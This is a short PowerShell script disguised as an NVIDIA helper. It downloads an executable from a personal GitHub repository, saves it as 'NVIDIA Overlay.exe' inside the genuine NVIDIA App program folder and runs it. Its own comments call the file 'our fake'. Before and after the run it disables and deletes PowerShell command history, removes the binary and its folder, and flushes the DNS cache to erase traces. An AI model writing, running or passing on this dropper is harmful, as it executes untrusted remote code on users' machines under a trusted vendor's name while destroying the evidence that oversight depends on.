# language: PowerShell, file: NvidiaWebHelper.ps1, target: Windows 11
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
Clear-History

$exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20Overlay.exe"
$targetDir = "$env:ProgramFiles\NVIDIA Corporation\NVIDIA App\CEF\NvidiaAppPermissionOc\NVIDIA"
$targetPath = Join-Path $targetDir "NVIDIA Overlay.exe"

# kill เฉพาะตัวปลอมของเรา
Get-Process -Name "NVIDIA Overlay" -ErrorAction SilentlyContinue |
    Where-Object {
        try { $_.Path -and $_.Path -like "*NvidiaAppPermissionOc*" }
        catch { $false }
    } |
    Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

if (-not (Test-Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

if (Test-Path $targetPath) {
    Remove-Item $targetPath -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500
}

# ดาวน์โหลด
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $wc.DownloadFile($exeUrl, $targetPath)
} catch {
    try {
        Invoke-WebRequest -Uri $exeUrl -OutFile $targetPath -UseBasicParsing
    } catch {
        Write-Host "Download failed: $($_.Exception.Message)" -ForegroundColor Red
        exit
    }
}

if (-not (Test-Path $targetPath)) { exit }

# รันและรอจนจบ แล้วลบทันที
try {
    $proc = Start-Process -FilePath $targetPath -PassThru
    Wait-Process -Id $proc.Id -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 1

    # kill ถ้ายังค้าง
    Get-Process -Id $proc.Id -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 500

    # ลบไฟล์
    Remove-Item $targetPath -Force -ErrorAction SilentlyContinue
} catch {
    Remove-Item $targetPath -Force -ErrorAction SilentlyContinue
    exit
}

# ลบโฟลเดอร์เปล่าถ้าไม่มีอะไรเหลือ
if (Test-Path $targetDir) {
    $remaining = Get-ChildItem -Path $targetDir -Force -ErrorAction SilentlyContinue
    if (-not $remaining) {
        Remove-Item $targetDir -Force -ErrorAction SilentlyContinue
    }
}

Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
Clear-History
ipconfig /flushdns 2>$null
